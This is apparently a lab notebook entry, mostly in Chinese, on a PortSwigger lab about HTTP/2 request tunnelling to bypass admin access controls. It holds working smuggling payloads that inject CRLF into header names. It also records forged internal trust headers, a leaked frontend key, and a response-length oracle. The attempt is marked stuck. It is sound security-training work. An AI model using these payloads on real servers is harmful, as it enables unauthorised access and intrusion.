---
title: "lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling"
---

# lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

PortSwigger `request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling`
(批 41 新实例 `0af400e604be096c804112a500e1000c`)。目标:以 administrator 访问 `/admin` 并删 carlos。

- 判定:**stuck**,但**门条件已读到原文**:"Admin interface only available if logged in as an administrator"。

## 关键新技术:嵌套响应的读取通道

```
h2_req <inst> --method HEAD --path /admin \
  --hdr2 'a: b\r\n\r\nGET /admin HTTP/1.1\r\nHost: <inst>\r\n<伪造头>...\r\n\r\nAA||zz'
```
外层 `HEAD /admin` 让前端的预期长度 = /admin 自身响应长度 ⇒ **h2 body 里直接出现嵌套响应的原始字节**
(HTTP 状态行 + 头 + body 前段)✓。外层用 `HEAD /` 时则得到
`500 "...Received only 3180 of expected 8880 bytes..."` —— 数字即嵌套响应长度,可当**长度 oracle**。

## 实测(全部 401 / 2776B)

- 嵌套 401 原文:`Admin interface only available if logged in as an administrator`。
- 伪造 mTLS 身份 **无效**:`X-SSL-VERIFIED: 1` + `X-SSL-CLIENT-CN: administrator`;
  再加**本实例实测泄漏的** `X-FRONTEND-KEY: 79247641`;再加 `X-Forwarded-For: 127.0.0.1`、真实 session cookie、
  `Host: localhost` —— 全部 401。
- 内部头泄漏复现(under-filled CL 让前端追加头落进评论正文):
  `X-SSL-VERIFIED: 0` / `X-SSL-CLIENT-CN: null` / `X-FRONTEND-KEY: <实例级静态值>`。
- 注入原语:header NAME 内 CRLF 透传(`--hdr2 'NAME||VALUE'`),注入的 h1 请求会执行(批 35 已证:评论落库)。

## 未决面

- 门是**会话角色**(不是 mTLS/前端头)。需要:让后端在 tunnelled 请求里看到"已是 administrator 的会话"
  —— 候选:①tunnelled `POST /login`(缺凭据)②伪造/复用 admin 的 session cookie(格式未定)
  ③检查是否只有 *admin 的浏览器连接* 才会拿到 admin 会话(前端不复用后端连接 ⇒ 无解?)。

## 复现

```
h2_req <inst> --method HEAD --path /admin --hdr2 'a: b\r\n\r\nGET /admin HTTP/1.1\r\nHost: <inst>\r\nCookie: session=<S>\r\nX-SSL-VERIFIED: 1\r\nX-SSL-CLIENT-CN: administrator\r\nX-FRONTEND-KEY: <leaked>\r\n\r\nAA||zz'
```
